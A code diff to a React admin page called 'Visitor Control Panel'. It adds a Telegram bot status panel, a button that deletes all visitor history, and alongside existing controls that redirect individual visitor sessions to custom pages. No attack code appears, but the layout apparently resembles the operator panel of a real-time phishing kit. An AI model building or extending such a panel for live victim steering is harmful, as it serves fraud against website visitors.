@@ -59,6 +59,16 @@ export default function Admin() {
     refetchInterval: 3000, // Auto-refresh every 3 seconds
   });
 
+  // Fetch Telegram status
+  const { data: telegramStatus } = useQuery({
+    queryKey: ["/api/admin/telegram-status"],
+    queryFn: async () => {
+      const response = await authenticatedFetch("/api/admin/telegram-status");
+      return response.json();
+    },
+    enabled: !!authToken,
+  });
+
   // Redirect mutation with auth
   const redirectMutation = useMutation({
     mutationFn: async ({ sessionId, redirectTarget }: { sessionId: string; redirectTarget: string }) => {
@@ -70,6 +80,20 @@ export default function Admin() {
     },
     onSuccess: () => {
       queryClient.invalidateQueries({ queryKey: ["/api/admin/visitors"] });
+    },
+  });
+
+  // Clear all visitors mutation
+  const clearVisitorsMutation = useMutation({
+    mutationFn: async () => {
+      const response = await authenticatedFetch("/api/admin/clear-visitors", {
+        method: "POST",
+      });
+      return response.json();
+    },
+    onSuccess: () => {
+      queryClient.invalidateQueries({ queryKey: ["/api/admin/visitors"] });
+      alert("All visitor history cleared successfully!");
     },
   });
 
@@ -91,6 +115,12 @@ export default function Admin() {
     }
     redirectMutation.mutate({ sessionId, redirectTarget: customPage });
     setCustomPages({ ...customPages, [visitorId]: "" }); // Clear after redirect
+  };
+
+  const handleClearHistory = () => {
+    if (confirm("⚠️ Are you sure you want to delete ALL visitor history? This action cannot be undone!")) {
+      clearVisitorsMutation.mutate();
+    }
   };
 
   if (!authToken) {
@@ -125,13 +155,63 @@ export default function Admin() {
       <div className="max-w-7xl mx-auto">
         <div className="flex justify-between items-center mb-8">
           <h1 className="text-3xl font-bold">Visitor Control Panel</h1>
-          <button
-            onClick={() => setAuthToken(null)}
-            className="px-4 py-2 bg-red-500 text-white rounded-md hover:bg-red-600"
-            data-testid="button-logout"
-          >
-            Logout
-          </button>
+          <div className="flex gap-3">
+            <button
+              onClick={handleClearHistory}
+              className="px-4 py-2 bg-orange-500 text-white rounded-md hover:bg-orange-600"
+              data-testid="button-clear-history"
+            >
+              Clear History
+            </button>
+            <button
+              onClick={() => setAuthToken(null)}
+              className="px-4 py-2 bg-red-500 text-white rounded-md hover:bg-red-600"
+              data-testid="button-logout"
+            >
+              Logout
+            </button>
+          </div>
+        </div>
+
+        {/* Telegram Configuration Status */}
+        <div className="bg-white rounded-lg shadow-md p-6 mb-6">
+          <h2 className="text-xl font-bold mb-4">Telegram Configuration</h2>
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div>
+              <label className="text-sm font-medium text-gray-600">Bot Token Status:</label>
+              <div className="mt-1 flex items-center gap-2">
+                {telegramStatus?.botConfigured ? (
+                  <>
+                    <span className="text-green-600">✓ Configured</span>
+                    <span className="text-gray-500 text-sm font-mono">{telegramStatus.botTokenPreview}</span>
+                  </>
+                ) : (
+                  <span className="text-red-600">✗ Not Configured</span>
+                )}
+              </div>
+            </div>
+            <div>
+              <label className="text-sm font-medium text-gray-600">Chat ID Status:</label>
+              <div className="mt-1 flex items-center gap-2">
+                {telegramStatus?.chatConfigured ? (
+                  <>
+                    <span className="text-green-600">✓ Configured</span>
+                    <span className="text-gray-500 text-sm font-mono">{telegramStatus.chatIdPreview}</span>
+                  </>
+                ) : (
+                  <span className="text-red-600">✗ Not Configured</span>
+                )}
+              </div>
+            </div>
+          </div>
+          <div className="mt-4 p-4 bg-blue-50 rounded-md border border-blue-200">
+            <p className="text-sm text-blue-800">
+              <strong>How to update Telegram credentials:</strong> Go to the <strong>Secrets</strong> tab in Replit (🔒 icon in left sidebar), then add or update:
+              <br />• <code className="bg-blue-100 px-1 rounded">TELEGRAM_BOT_TOKEN</code>
+              <br />• <code className="bg-blue-100 px-1 rounded">TELEGRAM_CHAT_ID</code>
+              <br />After updating secrets, restart your application.
+            </p>
+          </div>
         </div>
 
         {isLoading ? (
